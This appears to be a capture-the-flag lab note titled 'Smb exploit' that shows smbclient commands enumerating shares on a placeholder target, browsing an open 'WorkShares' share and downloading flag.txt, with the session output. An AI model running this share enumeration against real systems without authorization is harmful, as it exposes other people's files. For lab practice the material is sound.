### Smb exploit

`smbclient -L {target_ip}`

```
Password for [WORKGROUP\rwxrob]:
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

`for i in admin c ipc workshares; do echo $i; smbclient "\\\\{target_ip}\\$i"; done`

```
Try "help" to get a list of possible commands.
smb: \> get
get <filename> [localname]
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1732567 blocks available
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1732567 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as /tmp/smbmore.WEjsNC (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
s
```

